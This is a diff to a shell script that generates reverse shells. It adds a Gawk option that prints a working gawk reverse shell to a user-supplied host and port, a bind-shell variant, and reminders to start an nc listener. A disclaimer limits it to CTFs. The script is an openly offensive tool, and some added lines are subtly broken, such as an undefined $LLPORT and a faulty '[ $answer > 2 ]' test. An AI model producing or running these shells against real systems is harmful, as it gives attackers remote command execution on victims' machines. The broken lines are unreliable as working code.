@@ -1,25 +1,29 @@
 #!/bin/sh
 
 echo "########## Created by 0xpr0N3rd (GitHub) ##########\n\n"
-# Cheat sheets from PentestMoney and Highon.Coffe are used in this script. 
+# Cheat sheets from PentestMoney, Highon.Coffe and GTFOBins are used in this script. 
 
-echo "DISCLAIMER: This tool is developed only for legal purposes, such as CTFs. Developer does not take any responsibility in any kind of illegal usage.\n\n" 
+echo "DISCLAIMER!!! This tool is developed only for legal purposes, such as CTFs. Developer does not take any responsibility in any kind of illegal usage.\n\n" 
 echo "##### Reverse Shell Generator v1.0 #####\n\n"
 
 echo "Select the shell type you want to generate. Here are the types currently supported:"
 echo "\n### Bash, Python/3, PHP, Perl, Ruby, Netcat, Java, Telnet, Gawk ###"
 
 generateShell () {
-	echo "\nJust select one of them and let the magic happen: "; read type
+	echo "\nJust select one of them and let the magic happen (it's not case sensitive): "; read type # well, i tried to handle most of the cases
 	
-	dqt='"' # double quotation char
-	dsg='$' # dollar sign char
-	hold_i='i' # hold i char
-	hold_p='p' # hold p char
-	hold_tcp='tcp' # hold tcp string
-	hold_line='line' # hold line string
-	bsh='\' # hold backslash
-	exec='exec' # hold exec string
+	dqt='"' 		# hold double quotation char
+	dsg='$' 		# hold dollar sign char
+	hold_i='i' 		# hold i char
+	hold_p='p' 	 	# hold p char
+	hold_tcp='tcp' 	 	# hold tcp string
+	hold_line='line'	# hold line string
+	bsh='\' 		# hold backslash
+	exec='exec' 		# hold exec string
+	eq='='			# hold = char
+	zero='0'		# hold 0 number
+	RRHOST='RHOST'		# hold RHOST string
+	RRPORT='RPORT'		# hold RPORT string
 
 	case $type in
 		bash | BASH | bASH | Bash) 				# check if it's Bash
@@ -272,7 +276,48 @@ generateShell () {
 		;;
 		
 		gawk | GAWK | gAWK | Gawk)		# check if it's Gawk
-		echo "You have selected Gawk!"
+		echo "Alright, you have selected Gawk."
+		echo "\n\n1 - Do you want it to be in $dqt Non-interactive reverse shell $dqt format?"
+		echo "\n2 - Do you want it to be in $dqt Non-interactive bind shell $dqt format?"
+		echo "\nSeriously, just select 1 or 2:"; read answer
+		
+		checkAnswer() {
+			case $answer in
+				1)
+				echo "\nEnter RHOST:"; read RHOST
+				echo "\nEnter RPORT:"; read RPORT
+				echo "\nThere you go buddy:"
+				echo "\nRHOST=$RHOST"
+				echo "RPORT=$RPORT"
+				echo "gawk -v RHOST=$dsg$RRHOST -v RPORT=$dsg$RRPORT 'BEGIN {"
+				echo "	s = $dqt/inet/tcp/0$dqt RHOST $dqt/$dqt RPORT;"
+				echo "	while (1) {printf $dqt> $dqt |& s; if((s |& getline c)<$eq 0) break;"
+				echo "	while (c && (c |& getline) > 0) print $dsg$zero |& s; close(c)}}'"
+				echo "\n\n\nDon't forget to set your $dqt nc -l -p $RPORT $dqt :)"
+				;;
+				
+				2)
+				echo "\nEnter LPORT:"; read LPORT
+				echo "\nLPORT=$LPORT"
+				echo "gawk -v LPORT=$LLPORT 'BEGIN {"
+				echo "	s = $dqt/inet/tcp/$dqt LPORT $dqt/0/0$dqt;"
+				echo "	while (1) {printf $dqt> $dqt |& s; if ((s |& getline c) <$eq 0) break;"
+				echo "	while (c && (c |& getline) > 0) print $dsg$zero |& s; close(c)}}'"
+				echo "\n\n\nDon't forget to run $dsg nc <RHOST> $LPORT $dsg for this one :)"
+				;;
+				
+				*)
+
+				while [  $answer > 2  ]; do
+					echo "Hmm, someone's really curious. Unfortunately, there are no any other types present at the moment. Enter again:"; read answer
+					if [ $answer -le 2 ];then
+						checkAnswer
+						break
+					fi
+				done 
+				;;
+			esac
+		}; checkAnswer
 		;;
 		
 		*)
